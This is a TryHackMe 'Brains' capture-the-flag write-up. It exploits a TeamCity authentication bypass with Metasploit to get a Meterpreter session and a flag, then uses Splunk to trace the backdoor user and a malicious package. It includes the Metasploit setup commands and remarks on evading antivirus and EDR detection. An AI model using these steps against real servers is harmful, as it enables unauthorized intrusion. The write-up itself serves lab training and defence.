# THM-Brains-Easy
Try Hack Me Write Up
Hack the Server and blue team
tags: Metasploit splunk

# Part 1: Red Team

First were gonna run nmap to scan the ip address

`nmap -T4 -p- -A -oN nmap.txt <ip address>`

-T4 is second fastes scanning mode for nmap
-p- is all ports
-A extensive scan ie versons operating systems etc
-oN out puts to nmap.txt

![TryHackMe Screenshot](Screenshot%202026-03-13%20194944.png)

OK nice some important looking things things I saw which included the different ports that were open and the services running on them.
Port 43229 and 50000.
Team city looks intersting to me, so when I look it up I find 
'CVE-2024-27198 and CVE-2024-27199: JetBrains TeamCity Multiple Authentication Bypass Vulnerabilities (FIXED)' 
This is where I open metasploit
`search teamcity`

![TryHackMe Screenshot2](sc2.png)

`use 5`

Now we need to set Lhost local machine and Rhost remote machine used to define target and attacker machine...

`set RHOSTS [Target_IP] could be a range too

set LHOST [Your_IP]`


After checking and making sure I would be able to run the exploit I was getting some problems and I realized we the automatic port it was set to was the wrong one. I the begning we saw it was port 5000... 

so now we 
`set RPORT 50000`
![TryHackMe Screenshot2](sc3.png)

<img width="1153" height="74" alt="Image" src="https://github.com/user-attachments/assets/0b5d1a9a-327f-490c-978c-a81204efd781" />
nice lets continue on with the attack...

Was having some problems so I restarted metasploit and it worked...

<img width="1430" height="299" alt="Image" src="https://github.com/user-attachments/assets/f1cd75e8-12f2-4577-8f3c-dd0d0bf4a65a" />

Now we got the meterpreter!! Thats amazing the meteperpreter is way better than just a reverse shell it lives entirely in the ram and doesn't write to disk. Meaning we are in full ghost mode. Makes antivirus hard to get it and we are still communicating over an encrypted channel...


so now I can do commands like 
`ls
pwd
Search entire system ignoring errors(my favorite) you do have to run shell first

shell


find / -name "flag.txt" 2>/dev/null`


meterpreter also can run commands like 

`search [filename]`


but sometimes its not the best you can see here it didn't actually work... 


And boom We got it.


##IMPORTANT


next time popping open a shell is more risky becuase now that process can be logged and detected by lets say crowdstrike for unusual detection... then using meterpreter.

<img width="798" height="307" alt="Image" src="https://github.com/user-attachments/assets/d559f4ff-4e15-4f3b-b8d7-4b823f79cc13" />


# Part 2: Blue Team

Now we get access to use splunk to understand what a security analyst would do 

<img width="1408" height="827" alt="Image" src="https://github.com/user-attachments/assets/ed4cf7fa-72d0-490b-9167-f1e75a6205fb" />

Now there are different ways to search but the question is 

`What is the name of the backdoor user which was created on the server after exploitation?`

so we have to find the user that was created with maybe somthing like 

`| metasearch index=*
| stats count by index`
We do this to understand what kind of logs we can have before continuing to search for the user

<img width="1459" height="516" alt="Image" src="https://github.com/user-attachments/assets/5cfbf1ae-e987-4b5d-85f8-8189f492e852" />

Ok interesting only found two auth_logs...

<img width="1445" height="477" alt="Image" src="https://github.com/user-attachments/assets/7d75e307-0091-4961-aa6e-877dbd04cf58" />


`let's go deeper into this /var/log/auth.log
user source=*/var/log/auth.log`

#important I also had to add more fields...

<img width="1382" height="623" alt="Image" src="https://github.com/user-attachments/assets/6722c5cd-d99e-4fe7-9e03-d4fee1930b9a" />

After selcting the name field I can see the name of the user

<img width="1011" height="643" alt="Image" src="https://github.com/user-attachments/assets/952432b1-7a6f-4906-8d91-5a2fdd9d6222" />

I realized after you can also search 
`useradd`
to find the new user...

Now


`What is the name of the malicious-looking package installed on the server?`

After searching 

`index=main`

<img width="1295" height="533" alt="Image" src="https://github.com/user-attachments/assets/fd9852e6-fabf-48af-a4d4-cef6633e10fa" />

I see a lot of these installed packages... So we can go to extract fields and use spunks really nice feature

<img width="1700" height="714" alt="Image" src="https://github.com/user-attachments/assets/d756399f-16d2-4c3f-9c98-e7c2227333c0" />

Step 1: select sample event... then for method use space delimiter and then change the field4 to applicatino and seach to see all the installed packages.
from there we can change the date range from when user was created....



<img width="1695" height="643" alt="Image" src="https://github.com/user-attachments/assets/9e7a624a-1c02-4d1d-a1e5-0a83fbd0e236" />

